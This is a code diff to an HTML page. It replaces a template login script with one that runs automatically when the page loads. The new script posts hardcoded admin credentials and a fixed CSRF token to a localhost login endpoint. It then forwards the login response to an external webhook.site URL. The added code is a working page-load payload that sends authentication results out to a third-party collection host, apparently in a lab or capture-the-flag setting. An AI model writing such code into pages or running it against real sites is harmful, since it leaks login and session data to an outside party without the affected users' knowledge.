@@ -5,30 +5,45 @@
 </head>
 <body>
    <script>
-       fetch('/login', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded', // URL-encoded form data
-    },
-    body: new URLSearchParams({
-        username: 'admin', // Replace with the actual username
-        password: 'admin', // Replace with the actual password
-        _csrf: '<%= csrfToken %>' // CSRF token from your server-side template
+window.addEventListener('DOMContentLoaded', () => {
+    const csrfToken = 'k8bjiEQT-c4fYoukfbhAHxU4lE-_aDQm88gI'; // Injected CSRF token
+
+    fetch('http://127.0.0.1:58039/login', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: new URLSearchParams({
+            username: 'admin',
+            password: 'admin',
+            _csrf: csrfToken
+        })
     })
-})
-.then(response => response.json()) // Assuming the response is JSON
-.then(data => {
-    if (data.success) {
-        // Handle success (e.g., redirect or show success message)
-        window.location.href = '/dashboard'; // Adjust based on your flow
-    } else {
-        // Handle failure (e.g., show error message)
-        alert(data.message || 'Login failed');
-    }
-})
-.catch(error => {
-    console.error('Error:', error);
-    alert('Something went wrong!');
+    .then(res => res.json())
+    .then(data => {
+        console.log('Login response:', data);
+
+        // Send login response to a webhook
+        return fetch('https://webhook.site/8fe688bc-4748-4bb3-8d32-25dd0c2cdfd0', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                source: 'auto-login',
+                loginResponse: data
+            })
+        });
+    })
+    .then(webhookRes => {
+        if (!webhookRes.ok) {
+            throw new Error('Webhook request failed');
+        }
+        console.log('Webhook sent successfully');
+    })
+    .catch(err => {
+        console.error('Error:', err);
+    });
 });
    </script>
 </body>
